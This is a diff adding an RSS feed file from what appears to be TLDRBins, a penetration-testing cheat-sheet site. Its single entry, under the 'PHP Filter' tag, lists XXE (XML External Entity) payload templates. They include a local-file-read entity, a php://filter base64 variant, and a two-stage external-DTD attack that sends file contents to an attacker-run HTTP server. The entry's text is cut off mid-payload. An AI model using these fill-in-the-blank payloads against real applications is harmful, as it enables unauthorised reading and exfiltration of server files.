@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>PHP FIlter on TLDRBins</title>
+    <link>https://tldrbins.github.io/@php-filter/</link>
+    <description>Recent content in PHP FIlter on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@php-filter/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>XXE (XML External Entity)</title>
+      <link>https://tldrbins.github.io/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/xxe/</guid>
+      <description>XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34;&amp;gt;]&amp;gt; &amp;lt;&amp;lt;TAG&amp;gt;&amp;gt; &amp;lt;&amp;lt;TAG1&amp;gt;&amp;gt;&amp;amp;data;&amp;lt;/&amp;lt;TAG1&amp;gt;&amp;gt; &amp;lt;/&amp;lt;TAG&amp;gt;&amp;gt; XXE Template (With PHP Filter) &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=&amp;lt;FILE&amp;gt;&amp;#34;&amp;gt;]&amp;gt; &amp;lt;&amp;lt;TAG&amp;gt;&amp;gt; &amp;lt;&amp;lt;TAG1&amp;gt;&amp;gt;&amp;amp;data;&amp;lt;/&amp;lt;TAG1&amp;gt;&amp;gt; &amp;lt;/&amp;lt;TAG&amp;gt;&amp;gt; External DTD (2 Stage) 1. Create a evil.dtd &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=&amp;lt;FILE&amp;gt;&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;PORT&amp;gt;/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; 2. Host a Server python3 -m http.server &amp;lt;PORT&amp;gt; 2. XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;PORT&amp;gt;/evil.</description>
+    </item>
+  </channel>
+</rss>
